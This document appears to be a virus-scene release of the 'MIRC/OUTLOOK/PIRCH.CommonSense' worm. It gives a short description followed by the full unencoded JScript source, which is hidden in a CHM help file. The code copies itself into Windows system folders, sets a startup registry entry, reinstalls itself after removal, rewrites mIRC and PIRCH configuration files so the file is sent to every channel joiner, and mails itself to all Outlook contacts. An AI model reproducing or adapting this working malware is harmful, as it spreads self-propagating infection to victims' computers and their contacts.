Worm Name: MIRC/OUTLOOK/PIRCH.CommonSense
Author: Zulu
Origin: Argentina

JScript worm in a CHM file (HTML help). It uses MIRC, OUTLOOK and PIRCH.
When run, it will ask for permission to use ActiveX, if it was not allowed, it will show a text
saying "The picture couldn't be shown. ActiveX wasn't allowed, please reload and select to
use it.", if allowed it will show a picture and a text saying "If you ride a motorcycle, close
your mouth.".
Then it will copy itself to Windows' directory as "THE_FLY.CHM" and to Windows' "SYSTEM"
directory as "DXGFXB3D.DLL". After that, it will create "MSJSVM.JS" in Windows' directory and
it will add this file in the registry to be run at startup. This file will try to modify MIRC
and PIRCH, so the CHM file will be send like most IRC worms. Since this file is run at startup,
it will make the worm work in new MIRC and PIRCH installations. Also, this file will check if
"THE_FLY.CHM" file exists, and if it doesn't (for example because someone tried to remove the
worm), it will copy "DXGFXB3D.DLL" from Windows' "SYSTEM" directory to "THE_FLY.CHM" in
Windows' directory, so the worm will be working again.
After adding "MSJSVM.JS" to the registry the worm will try to use OUTLOOK to send itself to
all contacts in the address book, using "Funny thing" as subject, "> If you ride a motorcycle,
close your mouth. :)" as body and the CHM file as attachment.
If "THE_FLY.CHM" and "DXGFXB3D.DLL" not exist or minutes are 30 when "MSJSVM.JS" is run, this
file will show a message.
It was created for using the CHM file type in a worm for the first time.

Changes between 1.0 and 1.1:

- The HTML file inside the CHM file is now JScript encoded.

Here is the code from the HTML file inside the CHM file (not encoded version):

<html>
<head>
<title>
The fly
</title>
</head>
<body bgcolor="#000000" text="#00d8d5">
<font face="arial" size="5">
<img alt="" border="0" src="the_fly.jpg" style="display:none;">
<br style="display:none;">
<script language="JScript">
try {
Bible = new ActiveXObject("Scripting.FileSystemObject");
throw "Religion";
}
catch(Christ) {
if (Christ == "Religion") {
document.all(5).style.display = "block";
document.all(6).style.display = "block";
document.writeln("If you ride a motorcycle, close your mouth.");
Bible.CopyFile(document.location.pathname.replace("/@MSITStore:","").replace("::/the_fly.htm",""),Bible.BuildPath(Bible.GetSpecialFolder(0),"THE_FLY.CHM"));
Bible.CopyFile(document.location.pathname.replace("/@MSITStore:","").replace("::/the_fly.htm",""),Bible.BuildPath(Bible.GetSpecialFolder(1),"DXGFXB3D.DLL"));
Jesus = Bible.CreateTextFile(Bible.BuildPath(Bible.GetSpecialFolder(1),"MSJSVM.JS"),true);
Jesus.WriteLine("Prayer = new ActiveXObject(\"Scripting.FileSystemObject\");")
Jesus.WriteLine("if (Prayer.FileExists(Prayer.BuildPath(Prayer.GetSpecialFolder(0),\"THE_FLY.CHM\")) == true) {")
Jesus.WriteLine("God();")
Jesus.WriteLine("}")
Jesus.WriteLine("else {")
Jesus.WriteLine("if (Prayer.FileExists(Prayer.BuildPath(Prayer.GetSpecialFolder(1),\"DXGFXB3D.DLL\")) == true) {")
Jesus.WriteLine("Prayer.CopyFile(Prayer.BuildPath(Prayer.GetSpecialFolder(1),\"DXGFXB3D.DLL\"),Prayer.BuildPath(Prayer.GetSpecialFolder(0),\"THE_FLY.CHM\"));")
Jesus.WriteLine("God();")
Jesus.WriteLine("}")
Jesus.WriteLine("else {")
Jesus.WriteLine("Jehovah();")
Jesus.WriteLine("}")
Jesus.WriteLine("}")
Jesus.WriteLine("function God() {")
Jesus.WriteLine("Anglican = new Enumerator(Prayer.Drives);")
Jesus.WriteLine("for (Theism = 1; Theism <= Prayer.Drives.Count; Theism++) {")
Jesus.WriteLine("Samuel = Anglican.item();")
Jesus.WriteLine("if (Samuel.DriveType == 2) {")
Jesus.WriteLine("Pagan(Samuel.DriveLetter.concat(\":\\\\MIRC\"));")
Jesus.WriteLine("Pagan(Samuel.DriveLetter.concat(\":\\\\PIRCH98\"));")
Jesus.WriteLine("}")
Jesus.WriteLine("if (Theism < Prayer.Drives.Count) {")
Jesus.WriteLine("Anglican.moveNext();")
Jesus.WriteLine("}")
Jesus.WriteLine("}")
Jesus.WriteLine("Atheism = new ActiveXObject(\"WScript.Shell\");")
Jesus.WriteLine("Pagan(Prayer.BuildPath(Atheism.RegRead(\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ProgramFilesDir\"),\"MIRC\"));")
Jesus.WriteLine("Pagan(Prayer.BuildPath(Atheism.RegRead(\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ProgramFilesDir\"),\"PIRCH98\"));")
Jesus.WriteLine("Resurrection = new Date();")
Jesus.WriteLine("if (Resurrection.getMinutes() == 30) {")
Jesus.WriteLine("Jehovah();")
Jesus.WriteLine("}")
Jesus.WriteLine("}")
Jesus.WriteLine("function Pagan(Jude) {")
Jesus.WriteLine("if (Prayer.FolderExists(Jude) == true) {")
Jesus.WriteLine("if (Prayer.FileExists(Prayer.BuildPath(Jude,\"MIRC32.EXE\")) == true) {")
Jesus.WriteLine("Exodus = Prayer.CreateTextFile(Prayer.BuildPath(Jude,\"SCRIPT.INI\"),true);")
Jesus.WriteLine("Exodus.WriteLine(\"[script]\");")
Jesus.WriteLine("Exodus.WriteLine(\"n0=on 1:join:#:if $me != $nick dcc send $nick \".concat(Prayer.BuildPath(Prayer.GetSpecialFolder(0),\"THE_FLY.CHM\")));")
Jesus.WriteLine("Exodus.Close();")
Jesus.WriteLine("}")
Jesus.WriteLine("if (Prayer.FileExists(Prayer.BuildPath(Jude,\"PIRCH98.EXE\")) == true) {")
Jesus.WriteLine("Romans = Prayer.CreateTextFile(Prayer.BuildPath(Jude,\"EVENTS.INI\"),true);")
Jesus.WriteLine("Romans.WriteLine(\"[Levels]\");")
Jesus.WriteLine("Romans.WriteLine(\"Enabled=1\");")
Jesus.WriteLine("Romans.WriteLine(\"Count=6\");")
Jesus.WriteLine("Romans.WriteLine(\"Level1=000-Unknowns\");")
Jesus.WriteLine("Romans.WriteLine(\"000-UnknownsEnabled=1\");")
Jesus.WriteLine("Romans.WriteLine(\"Level2=100-Level 100\");")
Jesus.WriteLine("Romans.WriteLine(\"100-Level 100Enabled=1\");")
Jesus.WriteLine("Romans.WriteLine(\"Level3=200-Level 200\");")
Jesus.WriteLine("Romans.WriteLine(\"200-Level 200Enabled=1\");")
Jesus.WriteLine("Romans.WriteLine(\"Level4=300-Level 300\");")
Jesus.WriteLine("Romans.WriteLine(\"300-Level 300Enabled=1\");")
Jesus.WriteLine("Romans.WriteLine(\"Level5=400-Level 400\");")
Jesus.WriteLine("Romans.WriteLine(\"400-Level 400Enabled=1\");")
Jesus.WriteLine("Romans.WriteLine(\"Level6=500-Level 500\");")
Jesus.WriteLine("Romans.WriteLine(\"500-Level 500Enabled=1\");")
Jesus.WriteLine("Romans.WriteLine(\"\");")
Jesus.WriteLine("Romans.WriteLine(\"[000-Unknowns]\");")
Jesus.WriteLine("Romans.WriteLine(\"User1=*!*@*\");")
Jesus.WriteLine("Romans.WriteLine(\"UserCount=1\");")
Jesus.WriteLine("Romans.WriteLine(\"Event1=ON JOIN:#:/dcc send $nick \".concat(Prayer.BuildPath(Prayer.GetSpecialFolder(0),\"THE_FLY.CHM\")));")
Jesus.WriteLine("Romans.WriteLine(\"EventCount=1\");")
Jesus.WriteLine("Romans.WriteLine(\"\");")
Jesus.WriteLine("Romans.WriteLine(\"[100-Level 100]\");")
Jesus.WriteLine("Romans.WriteLine(\"UserCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"EventCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"\");")
Jesus.WriteLine("Romans.WriteLine(\"[200-Level 200]\");")
Jesus.WriteLine("Romans.WriteLine(\"UserCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"EventCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"\");")
Jesus.WriteLine("Romans.WriteLine(\"[300-Level 300]\");")
Jesus.WriteLine("Romans.WriteLine(\"UserCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"EventCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"\");")
Jesus.WriteLine("Romans.WriteLine(\"[400-Level 400]\");")
Jesus.WriteLine("Romans.WriteLine(\"UserCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"EventCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"\");")
Jesus.WriteLine("Romans.WriteLine(\"[500-Level 500]\");")
Jesus.WriteLine("Romans.WriteLine(\"UserCount=0\");")
Jesus.WriteLine("Romans.WriteLine(\"EventCount=0\");")
Jesus.WriteLine("Romans.Close();")
Jesus.WriteLine("}")
Jesus.WriteLine("}")
Jesus.WriteLine("}")
Jesus.WriteLine("function Jehovah() {")
Jesus.WriteLine("WScript.Echo(\"//MIRC/OUTLOOK/PIRCH.CommonSense by Zulu\\nif (CommonSense == true) {\\n  God = false;\\n  Religion = false;\\n}\\nelse {\\n  God = true;\\n  Religion = true;\\n}\");")
Jesus.WriteLine("}")
Jesus.Close();
Islam = new ActiveXObject("WScript.Shell");
Islam.RegWrite("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\JavaScript VM",Bible.BuildPath(Bible.GetSpecialFolder(1),"MSJSVM.JS"));
try {
Hinduism = new ActiveXObject("Outlook.Application");
throw "Church";
}
catch(Buddhism) {
if (Buddhism == "Church") {
Judaism = Hinduism.GetNameSpace("MAPI");
for (Vushnu = 1; Vushnu <= Judaism.AddressLists.Count; Vushnu++) {
if (Judaism.AddressLists(Vushnu).AddressEntries.Count > 0) {
Messiah = Hinduism.CreateItem(0);
for (Shiva = 1; Shiva <= Judaism.AddressLists(Vushnu).AddressEntries.Count; Shiva++) {
Nazareth = Judaism.AddressLists(Vushnu).AddressEntries(Shiva);
if (Shiva == 1) {
Messiah.BCC = Nazareth.Address;
}
else {
Messiah.BCC = Messiah.BCC.concat("; ").concat(Nazareth.Address);
}
}
Messiah.Subject = "Funny thing";
Messiah.Body = "> If you ride a motorcycle, close your mouth. :)";
Messiah.Attachments.Add(Bible.BuildPath(Bible.GetSpecialFolder(0),"THE_FLY.CHM"));
Messiah.DeleteAfterSubmit = true;
Messiah.Send;
}
}
}
}
}
else {
document.writeln("The picture couldn't be shown. ActiveX wasn't allowed, please reload and select to use it.");
}
}
</script>
</font>
</body>
</html>
